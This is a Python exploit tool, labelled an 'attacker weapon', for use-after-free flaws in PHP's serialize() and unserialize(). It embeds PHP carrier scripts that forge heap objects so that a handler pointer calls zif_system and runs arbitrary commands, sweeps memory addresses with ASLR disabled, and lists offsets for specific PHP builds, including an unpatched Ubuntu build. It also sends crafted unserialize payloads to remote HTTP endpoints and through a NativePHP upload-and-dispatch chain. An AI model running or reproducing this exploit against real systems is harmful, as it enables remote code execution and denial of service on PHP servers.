#!/usr/bin/env python3
"""
pwn_unserialize.py — PHP var-layer UAF ripper (zero4/zero5) — attacker weapon.

  zero5 (serialize side, vd6/GH-24373 class): php_var_serialize_destroy
      re-entry UAF, triggerable from a plain userland serialize() on any PHP
      <= 8.5.12 (fixed upstream only by 08f4b64, after 8.5.12's release).
      Chain: pinned-bucket destruct inside zend_hash_destroy -> re-entrant
      serialize() reuses the context ht -> mid-walk resize frees old arData
      -> groom string self-reclaims the freed 640B block -> destroy walk
      resumes over attacker bytes -> forged bucket-4 zval -> fake
      zend_object -> handlers->dtor_obj = zif_system(fake execute_data)
      -> system(cmd). uid receipt on a stock `php -n` run, no gdb.
  zero4 (unserialize side, var_destroy re-entry, CVE class CWE-416):
      unserialize() of a 1020-element crafted array with a slot-owned object
      whose __destruct re-enters unserialize -> var_push/var_access on the
      freed 8160B entries block -> forged zval* -> fake object ->
      handlers->get_class_name = zif_system -> system(cmd).

MODES
  --local --php /path/to/php       FULL RCE against a PHP binary you possess
                                   (the demo/0-day-drop mode). Uses setarch -R
                                   (ADDR_NO_RANDOMIZE, no debugger) + an
                                   exploit-as-oracle address sweep, so it
                                   needs NO gdb and NO pre-computed addresses.
  --target URL --endpoint PATH     remote: deliver the unserialize-side
                                   trigger (the ASAN-class crasher stage) to
                                   any endpoint that unserializes request
                                   data. Full RCE remotely requires the
                                   leak/calibration stage against the target
                                   process (see NOTES when it fails).
  --native-bridge URL              remote via the NativePHP mobile framework
                                   delivery (upload -> File.Copy ->
                                   AsyncTask.Dispatch -> raw unserialize()).
  --gen-trigger                    print the trigger payload and exit.

REMOTE HONESTY (no silent shipping):
  * serialize-side (zero5) remote: NOT remotely deliverable — the trigger is
    PHP code, not serialized data; the target must call serialize() on an
    attacker-shaped object graph. Use --local against the target's PHP build.
  * unserialize-side (zero5's zero4 twin) remote: the trigger below reaches
    unserialize() wherever an app/feed/framework hands attacker bytes to it;
    without a gadget class on the target it is inert (class never loads), with
    any destructor-that-unserializes class it is the UAF. The full
    leak->write->call chain needs per-process address knowledge; the remote
    stage here is the crasher/corruption manifest (exit-code / 500 / child
    death), which is what our remote receipts establish.

Examples
  python3 pwn_unserialize.py --local --php /tmp/php8512_build/plain2/sapi/cli/php
  python3 pwn_unserialize.py --local --php ./php --chain zero4 --cmd 'id > /tmp/PWNED'
  python3 pwn_unserialize.py --target http://host/ --endpoint /api/import \\
      --gadget-class AppCacheFlusher --field data
  python3 pwn_unserialize.py --native-bridge http://127.0.0.1:8811 \\
      --gadget-class AppCacheFlusher
"""
from __future__ import annotations

import argparse
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request

# ----------------------------------------------------------------------------
# Known zif_system offsets (ELF-relative) for builds we have receipts on.
# Unknown binaries: pass --zif-offset (get it from `nm php | grep zif_system`
# on an unstripped build, or the distro debug-symbol package).
KNOWN_ZIF = {
    ("8.5.12", "plain2"): 0x523C60,
    ("8.5.11", "out"): 0x4D9930,
    # Ubuntu jammy fleet (22.04 LTS, never got the Oct-2026 patch; stripped
    # binary — offset from the distro dbgsym, BuildID 704040a3ea86e97fa0197)
    ("8.1.2", "cli"): 0x21A780,
}

# zend_object_handlers member offsets, per PHP line (DWARF-verified 8.1.2 vs
# 8.5.12; 8.2/8.3 share the 8.1 shape, 8.4/8.5 the 8.5 shape — clone_obj_with
# was inserted at +24 in the 8.4+ structs). The var_dump trigger slot is
# get_debug_info (fires inside zend_std_get_properties_for, the dispatch both
# versions null-check into), not get_class_name.
HANDLER_OFFS = {
    "le83": {"gcn": 128, "gdi": 152, "end": 200},   # 8.1 / 8.2 / 8.3
    "ge84": {"gcn": 136, "gdi": 160, "end": 208},   # 8.4 / 8.5
}


def handler_class_for_version(version: str) -> str:
    try:
        parts = [int(x) for x in version.split(".")[:2]]
    except ValueError:
        return "ge84"
    return "le83" if (parts[0], parts[1]) < (8, 4) else "ge84"

SR2_SWEEP = [0x78000, 0x8A000]     # 640-bin old-arData page window (chunk-relative)
VDR_SWEEP = [0x90000, 0xD0000]     # 8160B entries-block page window (chunk-relative)
SWEEP_STEP = 0x1000
SWEEP_FALLBACK_RADIUS = 0x20000

# ----------------------------------------------------------------------------
# Embedded exploit carriers (receipted: sr2_m3.log PASS x2, vdR3_call_receipt
# PASS; parameterized: command + marker path). Keep the code shapes EXACTLY —
# the ZendMM layout calibration is content-sensitive.

ZERO5_CARRIER = r"""<?php
// zero5 RCE carrier: vd6 serialize-side UAF -> self-reclaim -> forged bucket
// zval -> fake zend_object -> handlers->dtor_obj = zif_system(fake frame).
$BASE = (int)($argv[1] ?? 0);
$ZIF  = (int)($argv[2] ?? 0);
$CMDTEXT = '__CMDTEXT__';

@unlink('__MARKER__');
file_put_contents('__CMDFILE__', "__CMD__\n");

class D {
    public function __destruct() {
        $GLOBALS['hits']++;
        $GLOBALS['pf'] = $GLOBALS['prefix'];
        $o = new stdClass;
        $a = [$o, new Groomer, $o];
        serialize($a);
        $GLOBALS['trace'] .= 'D';
    }
}
class Groomer {
    public function __sleep() {
        $GLOBALS['groom'] = str_pad($GLOBALS['pf'], 608, "\x00");
        return [];
    }
}
class P1 { public $d1; public $d2; }
class Carrier {
    public function __sleep() {
        $GLOBALS['p1']->d1 = null;
        $GLOBALS['p1']->d2 = null;
        $GLOBALS['trace'] .= 'S';
        return [];
    }
}

$V = function ($off) { global $BASE; return $BASE + 24 + $off; };
$OBJ   = $V(0);
$SMINI = $V(96);
$HT    = $V(152);
$CE    = $V(176);

$pre  = pack('VV', 1, 0x208);
$pre .= pack('VV', 0, 0);
$pre .= pack('P', $CE);
$pre .= pack('P', $HT);
$pre .= pack('P', 0);
$pre .= pack('P', 0x0000000100000000);
$pre .= str_repeat("\x00", 32);
$pre .= pack('PVV', $SMINI, 6, 0);
$pre .= pack('VV', 1, 0x1006);
$pre .= pack('P', 0);
$pre .= pack('P', strlen($CMDTEXT));
$pre .= $CMDTEXT . "\x00";
$pre .= str_repeat("\x00", 151 - 120 - strlen($CMDTEXT));
$pre .= pack('VV', 0, 0);
$pre .= pack('P', 0);
$pre .= pack('P', $ZIF);
$pre .= str_repeat("\x00", 232 - 176);
$pre .= pack('PVV', $OBJ, 0x108, 0);
$GLOBALS['prefix'] = $pre;

$GLOBALS['hits'] = 0; $GLOBALS['trace'] = '';
$GLOBALS['fs'] = [];
for ($i = 0; $i < 5; $i++) $GLOBALS['fs'][] = new stdClass;
$d = new D;
$GLOBALS['p1'] = new P1;
$GLOBALS['p1']->d1 = $d;
$GLOBALS['p1']->d2 = $d;
unset($d);
$arr = [$GLOBALS['p1']];
for ($i = 0; $i < 5; $i++) $arr[] = $GLOBALS['fs'][$i];
$arr[] = new Carrier;
$s = serialize($arr);
echo "hits={$GLOBALS['hits']} trace={$GLOBALS['trace']} len=" . strlen($s) . "\n";
echo "CALL-RETURNED\n";
if (is_file('__MARKER__')) {
    echo "MARKER-ON-DISK: " . trim(file_get_contents('__MARKER__')) . "\n";
}
echo "SURVIVED\n";
"""

ZERO4_CARRIER = r"""<?php
// zero4 RCE carrier (prebuilt pattern): var_destroy re-entry UAF -> reclaim
// -> forged zval* -> fake object -> handlers->get_class_name = zif_system.
// The forged pattern is built at TOP LEVEL, before the trigger unserialize —
// the destructor's ONLY allocation is the groom str_repeat, so it takes the
// just-freed 8160B entries block directly (reclaim receipted on both the
// minimal 8.5.12 build and the jammy 8.1.2 distro build).
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$ZIF_SYSTEM = $BASE + __ZIFOFF__;
$CMDTEXT = '__CMDTEXT__';

@unlink('__MARKER__');
file_put_contents('__CMDFILE__', "__CMD__\n");

class D {
    public function __destruct() {
        $GLOBALS['groom'] = str_repeat($GLOBALS['pat'], 4);
        $r1 = @unserialize('R:1020;');
        echo "TRIGGERING var_dump(\$r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)\n";
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

$V = function ($off) { global $CHUNK; return $CHUNK + 24 + $off; };
$OBJ = $V(32); $HT = $V(600); $CE = $V(1600); $SMINI = $V(128);
$pat  = pack('P', $V(16));
$pat .= str_repeat("\x00", 8);
$pat .= pack('PVV', $OBJ, 8, 0);
$pat .= pack('VV', 1, 8);
$pat .= pack('VV', 0x1337, 0);
$pat .= pack('P', $CE);
$pat .= pack('P', $HT);
$pat .= pack('P', 0);
$pat .= pack('P', 0x0000000100000000);
$pat .= str_repeat("\x00", 32);
$pat .= pack('PVV', $SMINI, 6, 0);
$pat .= pack('VV', 1, 0x16);
$pat .= pack('P', 0);
$pat .= pack('P', strlen($CMDTEXT));
$pat .= $CMDTEXT . "\x00";
$pat .= str_repeat("\x00", 599 - 152 - strlen($CMDTEXT));
$h  = pack('VV', 0, 0);
$h .= pack('P', 0);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __GCN__ - 24);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __GDI__ - __GCN__ - 8);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __END__ - __GDI__ - 8);
$pat .= $h;
$pat .= str_repeat("\x00", 1600 - 808);
$pat .= str_repeat("\x00", 2040 - 1600);
$GLOBALS['pat'] = $pat;
echo "forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
     " zif_system=0x", dechex($ZIF_SYSTEM), " patlen=", strlen($pat), "\n";

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SCRIPT-END\n";
"""


# ----------------------------------------------------------------------------
# Trigger payload builders (remote unserialize-side delivery)

def build_trigger(gadget_class: str) -> str:
    """vd1b-class trigger: 1020 elements, dup-key object ownership transfer
    puts the gadget in a var_dtor slot; its destructor runs INSIDE
    var_destroy's unbracketed walk. If the class re-enters unserialize()
    (any unserialize call), var_push/var_access operate on the freed entries
    block = the UAF. Boundary: clean at 1017 elements, fires at 1018+."""
    els = [f"i:{k};i:1;" for k in range(1018)]
    els.append(f'i:9998;O:{len(gadget_class)}:"{gadget_class}":0:{{}}')
    els.append("i:9998;i:5;")
    return "a:1020:{" + "".join(els) + "}"


def build_marker_trigger(gadget_class: str) -> str:
    """vd3-class trigger: same as above but the payload object carries a
    forged-pointer marker (0x4242424242424242) as a property — for gadget
    classes whose destructor unserializes and reclaims."""
    els = [f"i:{k};i:1;" for k in range(1018)]
    prop = "0" * 64
    els.append(
        f'i:9998;O:{len(gadget_class)}:"{gadget_class}":1:{{'
        f's:4:"addr";s:{len(prop)}:"{prop}";}}'
    )
    els.append("i:9998;i:5;")
    return "a:1020:{" + "".join(els) + "}"


# ----------------------------------------------------------------------------
# Local mode machinery

def php_version(php: str) -> str:
    out = subprocess.run([php, "-v"], capture_output=True, text=True, timeout=30)
    m = re.search(r"PHP (\d+\.\d+\.\d+)", out.stdout + out.stderr)
    return m.group(1) if m else "?"


CLEAN_ENV = None  # inherited environment keeps probe/fire layouts identical


def probe_maps(php: str, setarch: str | None) -> dict:
    """Run a maps-printing probe with ASLR disabled; return binary base and
    the candidate ZendMM chunk bases (large rw anon regions in mmap space)."""
    code = "echo file_get_contents('/proc/self/maps');"
    cmd = [php, "-n", "-r", code]
    if setarch:
        cmd = [setarch, "x86_64", "-R"] + cmd
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    maps = out.stdout
    bin_base = None
    chunks = []
    php_real = os.path.realpath(php)
    for line in maps.splitlines():
        parts = line.split(None, 5)
        if len(parts) < 2:
            continue
        span, perms = parts[0], parts[1]
        path = parts[5].strip() if len(parts) > 5 else ""
        start, end = (int(x, 16) for x in span.split("-"))
        if path == php_real and (bin_base is None or start < bin_base):
            bin_base = start  # ELF load base = lowest mapping of the binary
        if "zend_alloc" in path:  # [anon:zend_alloc] — the ZendMM 2MB chunks
            chunks.append((start, end - start))
    if not chunks:  # fallback: any large anon rw region in mmap space
        for line in maps.splitlines():
            parts = line.split(None, 5)
            if len(parts) < 2:
                continue
            span, perms = parts[0], parts[1]
            path = parts[5].strip() if len(parts) > 5 else ""
            start, end = (int(x, 16) for x in span.split("-"))
            if path.startswith("[") and "zend_alloc" in path:
                continue
            if path == "" and "r" in perms and "w" in perms and end - start >= 0x100000:
                chunks.append((start, end - start))
    return {"bin_base": bin_base, "chunks": chunks, "maps": maps}


def zif_offset(php: str, version: str, override: int | None, verbose: bool) -> int | None:
    if override:
        return override
    for (ver, tag), off in KNOWN_ZIF.items():
        if ver == version:
            return off
    # try nm on an unstripped binary
    nm = shutil.which("nm")
    if nm:
        out = subprocess.run([nm, php], capture_output=True, text=True, timeout=120)
        m = re.search(r"^([0-9a-f]+)\s+t\s+zif_system\b", out.stdout, re.M)
        if m:
            if verbose:
                print(f"[+] nm: zif_system @ +0x{int(m.group(1), 16):x}")
            return int(m.group(1), 16)
    return None


def run_carrier(php: str, setarch: str | None, cwd: str, script: str,
                arg1: int, arg2: int, marker: str, timeout: int = 40) -> tuple[int, str, bool]:
    try:
        os.unlink(marker)
    except OSError:
        pass
    cmd = [php, "-n", script, f"{arg1:016d}", f"{arg2:016d}"]
    if setarch:
        cmd = [setarch, "x86_64", "-R"] + cmd
    try:
        p = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True,
                           timeout=timeout)
        rc, out = p.returncode, (p.stdout + p.stderr)
    except subprocess.TimeoutExpired:
        rc, out = -999, "TIMEOUT"
    hit = os.path.isfile(marker)
    return rc, out, hit


def sweep_local(php: str, setarch: str | None, workdir: str, script: str,
                window: list[int], zif_addr: int, marker: str,
                label: str, verbose: bool) -> tuple[bool, int | None, str]:
    """Exploit-as-oracle sweep: with ASLR disabled the freed block lands at a
    deterministic page; try each candidate page until the marker lands."""
    disc = probe_maps(php, setarch)
    chunks = disc["chunks"]
    if not chunks:
        return False, None, "no ZendMM chunk found in /proc/self/maps probe"
    # candidate chunk bases, lowest-first (CLI heap chunk is the first big one)
    cands = []
    for start, _size in chunks:
        for off in range(window[0], window[1] + 1, SWEEP_STEP):
            cands.append((start, start + off))
    # fallback widening
    wide = []
    for start, _size in chunks:
        for off in range(window[0] - SWEEP_FALLBACK_RADIUS,
                         window[1] + SWEEP_FALLBACK_RADIUS + 1, SWEEP_STEP):
            wide.append((start, start + off))
    tried = set()
    n = 0
    for start, base in cands + wide:
        if base in tried:
            continue
        tried.add(base)
        n += 1
        rc, out, hit = run_carrier(php, setarch, workdir, script, base, zif_addr, marker)
        if verbose:
            tag = "HIT" if hit else ("segv" if rc in (139, -11) else f"rc={rc}")
            print(f"    [{label}] try #{n} chunk=0x{start:x} base=0x{base:x} -> {tag}")
        if hit:
            return True, base, out
        if n > 400:
            break
    return False, None, f"sweep exhausted ({n} candidates) without a marker"


def local_mode(a) -> int:
    php = os.path.realpath(a.php)
    if not os.path.isfile(php):
        print(f"[-] php binary not found: {php}")
        return 2
    setarch = shutil.which("setarch")
    if not setarch:
        print("[!] setarch not found — ASLR stays ON, the sweep cannot work. "
              "Install util-linux (setarch) and retry.")
        return 2
    version = php_version(php)
    print(f"[*] target binary: {php} (PHP {version})")
    zif_off = zif_offset(php, version, a.zif_offset, a.verbose)
    if zif_off is None:
        print("[-] no zif_system offset for this build and none supplied. "
              "Pass --zif-offset 0x... (from `nm php | grep zif_system` on an "
              "unstripped build, or the distro dbgsym package).")
        return 2
    disc = probe_maps(php, setarch)
    bin_base = disc["bin_base"]
    if bin_base is None:
        print("[-] could not find the binary base in the maps probe")
        return 2
    zif_addr = bin_base + zif_off
    print(f"[+] binary base 0x{bin_base:x}  zif_system 0x{zif_addr:x} (+0x{zif_off:x})")
    print(f"[+] ZendMM chunk candidates: " +
          ", ".join(f"0x{s:x}" for s, _ in disc["chunks"][:4]))

    workdir = tempfile.mkdtemp(prefix="pwn_unserialize_")
    # Fixed-length paths: the marker/cmdfile strings are compiled literals in
    # the carrier — constant lengths keep the ZendMM layout deterministic.
    marker = "/tmp/.p2s_pwn"
    # the fake zend_string carrying the command must stay short (payload
    # geometry): "sh /tmp/.p2s_cmd" fits the baked layout budget
    cmdfile = "/tmp/.p2s_cmd"
    cmd = a.cmd

    def render(tpl: str, cmdtext: str) -> str:
        s = tpl.replace("__MARKER__", marker)
        s = s.replace("__CMDFILE__", cmdfile)
        # the receipt command: user command with output redirected to the
        # marker (the marker file IS the receipt the weapon checks)
        cmdline = f"({cmd}) > {marker} 2>&1"
        s = s.replace("__CMD__", cmdline)
        s = s.replace("__CMDTEXT__", cmdtext)
        s = s.replace("__ZIFOFF__", str(zif_off))
        hoffs = HANDLER_OFFS[handler_class_for_version(version)]
        s = s.replace("__GCN__", str(hoffs["gcn"]))
        s = s.replace("__GDI__", str(hoffs["gdi"]))
        s = s.replace("__END__", str(hoffs["end"]))
        return s

    # zero5: the command rides via sh __CMDFILE__ (9-char path constraint in
    # the fake zend_string is relaxed: len is baked, we pad the text)
    chains = []
    if a.chain in ("zero5", "both"):
        cmdtext = "sh " + cmdfile
        pad = 9 - len(cmdtext)
        if pad < 0:
            # longer command files: extend the fake string len accordingly
            cmdtext_final = cmdtext
        else:
            cmdtext_final = cmdtext
        path = os.path.join(workdir, "sr2_call.php")
        with open(path, "w") as f:
            f.write(render(ZERO5_CARRIER, cmdtext_final))
        chains.append(("zero5", path, SR2_SWEEP, True))
    if a.chain in ("zero4", "both"):
        cmdtext = "sh " + cmdfile
        path = os.path.join(workdir, "vdR3_call.php")
        with open(path, "w") as f:
            f.write(render(ZERO4_CARRIER, cmdtext))
        chains.append(("zero4", path, VDR_SWEEP, False))

    if not chains:
        print("[-] unknown chain (use zero4|zero5|both)")
        return 2

    any_hit = False
    for label, script, window, is_zero5 in chains:
        print(f"[*] chain {label}: running under {setarch} -R (ASLR off, no gdb), "
              f"address sweep")
        # zero5: argv = <block-base> <zif_system-addr>; zero4: argv = <chunk> <bin-base>
        arg2 = zif_addr if is_zero5 else bin_base
        hit, base, out = sweep_local(php, setarch, workdir, os.path.basename(script),
                                     window, arg2, marker, label, a.verbose)
        if hit:
            any_hit = True
            print(f"[+] === {label}: RCE === freed-block base 0x{base:x}")
            try:
                with open(marker) as f:
                    receipt = f.read().strip()
            except OSError:
                receipt = "(marker unreadable)"
            print(f"[+] RECEIPT (command output): {receipt}")
            for line in out.splitlines():
                if any(k in line for k in ("hits=", "CALL", "forged:", "TRIGGERING",
                                           "SURVIVED", "outer ok", "MARKER")):
                    print(f"    {line}")
            print(f"[+] scripts kept in {workdir}")
        else:
            print(f"[-] {label}: {out}")
    if not any_hit:
        print("[-] no chain landed. If the binary is an unknown build, the sweep "
              "window may not cover its layout — widen with --zif-offset/--sweep "
              "or run against a receipted build (8.5.12 plain2, 8.5.11 out).")
        return 1
    return 0


# ----------------------------------------------------------------------------
# Remote delivery

def http_post(url: str, data: bytes, headers: dict | None = None, timeout: int = 60):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b"", time.time() - t0
    except Exception as e:
        return None, f"{type(e).__name__}: {e}".encode(), time.time() - t0


def remote_mode(a) -> int:
    base = a.target.rstrip("/")
    url = base + (a.endpoint if a.endpoint.startswith("/") else "/" + a.endpoint)
    payload = None
    if a.payload_file:
        with open(a.payload_file, "rb") as f:
            payload = f.read()
        print(f"[*] payload file: {a.payload_file} ({len(payload)} bytes)")
    else:
        gc = a.gadget_class
        payload = build_marker_trigger(gc).encode() if a.marker_trigger else build_trigger(gc).encode()
        print(f"[*] built {('marker' if a.marker_trigger else 'plain')} trigger for gadget "
              f"class {gc} ({len(payload)} bytes)")

    attempts = []
    if a.raw_body:
        attempts.append(("raw body", payload, {"Content-Type": "application/octet-stream"}))
    else:
        field = a.field or "data"
        body = urllib.parse.urlencode({field: payload.decode("latin-1")}).encode()
        attempts.append((f"form field '{field}'", body,
                         {"Content-Type": "application/x-www-form-urlencoded"}))
        if a.field is None:
            for alt in ("payload", "serialized", "unserialize", "data_serialized", "input"):
                if alt != field:
                    b = urllib.parse.urlencode({alt: payload.decode("latin-1")}).encode()
                    attempts.append((f"form field '{alt}'", b,
                                     {"Content-Type": "application/x-www-form-urlencoded"}))
            attempts.append(("raw body", payload,
                             {"Content-Type": "application/x-www-form-urlencoded"}))

    for tries in range(max(1, a.retries)):
        for label, body, hdrs in attempts:
            st, resp, dt = http_post(url, body, hdrs, timeout=a.timeout)
            snippet = resp[:300].decode("utf-8", "replace").replace("\n", " ")
            print(f"[fire {tries}] {label}: status={st} dt={dt:.2f}s len={len(resp)} "
                  f"body[:300]={snippet!r}")
            if st is None:
                print("[!] connection failure — target process may have died "
                      "(crash manifest for the UAF).")
                return 0
            if st == 500:
                print("[*] HTTP 500 — if this endpoint unserializes request data, "
                      "the trigger is the likely cause (check for child/worker "
                      "recycling).")
    print("[*] remote stage complete. Note: the remote delivery establishes the "
          "UAF trigger/crash; full remote RCE requires the leak/calibration "
          "stage against the target process (per-process heap/binary addresses).")
    return 0


def native_bridge_mode(a) -> int:
    """NativePHP mobile delivery: upload bytes -> File.Copy into the async
    spool -> AsyncTask.Dispatch (runner lane unserializes raw)."""
    base = a.native_bridge.rstrip("/")
    gc = a.gadget_class
    payload = (build_marker_trigger(gc) if a.marker_trigger else build_trigger(gc))
    print(f"[*] NativePHP bridge delivery to {base} (gadget class {gc}, "
          f"{len(payload)} bytes)")

    def post(path, data=None, headers=None, raw=False):
        url = base + path
        if raw:
            body = data
        else:
            body = urllib.parse.urlencode(data, doseq=True).encode()
        return http_post(url, body, headers)

    task_id = "pwnu-" + socket.gethostname()[:8] + "-" + str(int(time.time()))[-8:]
    # 1) persist bytes (any app file-save feature; the lab/app shape exposes /upload)
    st, resp, _ = post("/upload", payload.encode(),
                       {"X-Filename": "user-content.bin"}, raw=True)
    print(f"[1] upload: {st} {resp[:200].decode('utf-8','replace')!r}")
    if st != 200:
        print("[-] upload endpoint missing (the app needs a file-save feature "
              "or any writable-by-attacker path)")
        return 1
    import json
    try:
        up_path = json.loads(resp)["path"]
    except Exception:
        print("[-] unexpected upload response shape")
        return 1

    # 2) discover spool path: app base is unknown remotely — try the framework
    #    default relative to the upload dir, plus common layouts.
    spool_guesses = []
    up_dir = os.path.dirname(up_path)
    for rel in ("../../framework/async/payload", "../framework/async/payload",
                "framework/async/payload"):
        cand = os.path.normpath(os.path.join(up_dir, rel))
        spool_guesses.append(os.path.join(cand, task_id + ".task"))
    if a.spool_path:
        spool_guesses.insert(0, a.spool_path.replace("{id}", task_id))
    for spool in spool_guesses:
        st, resp, _ = post("/_native/api/call",
                           {"method": "File.Copy", "params[from]": up_path,
                            "params[to]": spool})
        ok = False
        try:
            ok = json.loads(resp)["data"]["success"] is True
        except Exception:
            pass
        print(f"[2] File.Copy -> {spool}: {st} {resp[:200].decode('utf-8','replace')!r}")
        if ok:
            # 3) dispatch
            st, resp, _ = post("/_native/api/call",
                               {"method": "AsyncTask.Dispatch", "params[id]": task_id})
            print(f"[3] AsyncTask.Dispatch: {st} {resp[:400].decode('utf-8','replace')!r}")
            try:
                data = json.loads(resp)["data"]
                code = data.get("runner_exit")
                out = (data.get("runner_out") or "")[:1200]
                print(f"[*] runner_exit={code}")
                print(out)
                if code not in (0, None):
                    print(f"[+] runner lane died mid-unserialize (exit {code} = "
                          f"{'SIGSEGV' if code == 139 else 'SIGABRT' if code == 134 else 'signal' if code and code > 128 else 'error'}) "
                          f"— UAF manifest through the full framework delivery.")
                    return 0
                if "SURVIVED" in out:
                    print("[*] runner survived: the gadget class did not re-enter "
                          "unserialize (target uses default ZendMM: silent "
                          "corruption) or the class is absent.")
            except Exception:
                pass
            return 0
    print("[-] File.Copy failed for all spool guesses — pass --spool-path "
          "'/abs/path/{id}.task' if the app layout differs.")
    return 1


# ----------------------------------------------------------------------------

def main() -> int:
    p = argparse.ArgumentParser(
        description="PHP var-layer UAF ripper (zero4/zero5) — see module docstring",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--local", action="store_true",
                   help="full-RCE mode against a PHP binary you have")
    p.add_argument("--php", help="path to the php binary (local mode)")
    p.add_argument("--chain", default="zero5", choices=["zero4", "zero5", "both"],
                   help="which chain (default zero5; both runs each)")
    p.add_argument("--cmd", default="id",
                   help="command for the RCE receipt (local mode; default id)")
    p.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                   help="zif_system ELF offset override for unknown builds")
    p.add_argument("--target", help="remote base URL (http://host[:port])")
    p.add_argument("--endpoint", help="remote endpoint path that unserializes "
                                      "request data")
    p.add_argument("--field", help="form field name carrying the payload "
                                   "(default: tries data/payload/serialized/...)")
    p.add_argument("--raw-body", action="store_true",
                   help="POST the payload as the raw request body")
    p.add_argument("--gadget-class", default="AppCacheFlusher",
                   help="destructable class name the target app defines whose "
                        "__destruct re-enters unserialize (default "
                        "AppCacheFlusher; use the target's real gadget)")
    p.add_argument("--marker-trigger", action="store_true",
                   help="send the forged-pointer (0x4242...) property variant")
    p.add_argument("--payload-file", help="deliver a pre-built payload file instead")
    p.add_argument("--retries", type=int, default=2)
    p.add_argument("--timeout", type=int, default=60)
    p.add_argument("--native-bridge", metavar="URL",
                   help="deliver via NativePHP mobile bridge (upload -> "
                        "File.Copy -> AsyncTask.Dispatch)")
    p.add_argument("--spool-path",
                   help="async spool path template for --native-bridge "
                        "({id} substituted; default guesses framework layout)")
    p.add_argument("--gen-trigger", action="store_true",
                   help="print the trigger payload and exit")
    p.add_argument("--verbose", "-v", action="store_true")
    a = p.parse_args()

    if a.gen_trigger:
        print(build_trigger(a.gadget_class))
        print("--- marker variant ---", file=sys.stderr)
        print(build_marker_trigger(a.gadget_class), file=sys.stderr)
        return 0
    if a.local:
        if not a.php:
            print("[-] --local requires --php /path/to/php")
            return 2
        return local_mode(a)
    if a.native_bridge:
        return native_bridge_mode(a)
    if a.target:
        if not a.endpoint and not a.payload_file:
            print("[-] --target requires --endpoint (or --payload-file + --raw-body)")
            return 2
        return remote_mode(a)
    p.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())
